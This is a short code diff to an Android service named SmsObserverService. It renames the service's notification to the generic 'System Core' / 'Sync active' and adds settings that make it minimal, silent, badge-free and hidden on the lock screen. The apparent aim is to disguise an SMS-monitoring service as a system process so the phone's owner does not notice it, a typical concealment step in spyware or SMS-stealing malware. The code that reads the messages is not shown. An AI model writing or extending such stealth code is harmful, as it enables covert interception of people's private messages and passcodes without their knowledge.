@@ -36,11 +36,30 @@ class SmsObserverService : Service() {
 
     private fun createNotification(): android.app.Notification {
         val channelId = AppConstants.SERVICE_NOTIFICATION_CHANNEL
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = android.app.NotificationChannel(
+                channelId,
+                "System Core",
+                android.app.NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+            }
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            nm.createNotificationChannel(channel)
+        }
+
         return androidx.core.app.NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Device Care")
-            .setContentText("Messaging service verified")
+            .setContentTitle("System Core")
+            .setContentText("Sync active")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
+            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
     }
